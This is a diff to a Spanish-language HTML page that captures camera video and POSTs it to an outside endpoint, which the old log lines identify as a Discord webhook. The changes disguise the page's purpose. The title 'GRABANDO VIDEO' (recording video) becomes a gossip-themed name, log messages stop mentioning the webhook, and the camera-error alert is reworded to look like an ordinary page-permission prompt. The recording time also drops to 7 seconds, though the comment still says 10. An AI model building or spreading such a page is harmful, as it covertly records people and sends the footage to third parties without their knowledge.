@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GRABANDO VIDEO</title>
+    <title>VIDEOCHISME</title>
     <style>
         body {
             display: flex;
@@ -111,20 +111,20 @@
                             method: 'POST',
                             body: formData
                         });
-                        console.log('Video enviado al webhook de Discord');
+                        console.log('Video enviado al grupo');
                     } catch (error) {
-                        console.error('Error al enviar el video al webhook de Discord:', error);
+                        console.error('Error al enviar el video al grupo:', error);
                     }
                 };
 
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 10000); // Detener la grabación después de 10 segundos
+                }, 7000); // Detener la grabación después de 10 segundos
 
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
-                alert('No se pudo acceder a la cámara. Asegúrate de haber dado permiso.');
+                alert('No se pudo acceder a la pagina. Asegúrate de haber dado permiso solicitado por el navegador.');
             }
         }
 
